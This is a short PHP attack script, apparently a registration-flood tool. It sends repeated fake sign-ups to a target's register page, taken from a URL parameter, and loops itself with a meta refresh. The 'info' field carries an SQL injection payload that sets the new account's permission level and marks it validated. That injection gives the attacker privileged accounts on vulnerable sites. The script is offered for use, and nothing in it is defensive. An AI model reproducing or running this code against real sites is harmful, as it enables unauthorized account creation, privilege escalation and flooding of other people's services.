<?php
$url = $_GET['url'];
$p = $_GET['p'];
$d = $_GET['d'];
////http://localhost/wapbies.com_edit/reg_flood.php?d=http://localhost/wapbies.com_edit/reg_flood.php&url=http://localhost/wapbies.com_edit/brg.php&p=1 
//http://localhost/reg_flood.php?d=http://localhost/reg_flood.php&url=http://localhost/mak/register.php&p=1
class Browser {
function __construct($ua="") {
$this->UserAgent = $ua;
}
public $curl, $count, $data,$UserAgent;
function url($url) { $this->curl = curl_init($url); }
function fields($count) { $this->count = $count; }
function data($data) { $this->data = strtolower($data); }
function send() {
curl_setopt($this->curl, CURLOPT_POST, $this->count);
if(!empty($this->UserAgent)) {
curl_setopt($this->curl, CURLOPT_USERAGENT, $this->UserAgent);
 }
curl_setopt($this->curl, CURLOPT_POSTFIELDS, $this->data);
curl_setopt($this->curl, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($this->curl);
curl_close($this->curl);
return $result;
}
 
}
 /////This is coded by ayoomo9/////, dont copy guys
 $rand = rand(2000,30000);
 
 
 
$uid = "hacker$rand";
 
$info = "Am hired to hack you!',perm='$p',validated='1'#";
$m = new Browser("hacker");

$m->url("$url");
$m->fields(12);
$m->data("uid=$uid&pwd=adminlol&cpw=adminlol&day=31&month=03-&year=1990-&usx=M&ulc=hackers village&email=hacker@hacker.com&info=$info");
 
print_r($m->send());
 
 if(print_r($m->send()))
 {

 echo "<meta http-equiv=\"refresh\" content=\"0; URL=$d?url=$url&p=$p\" />";
 }
 
?>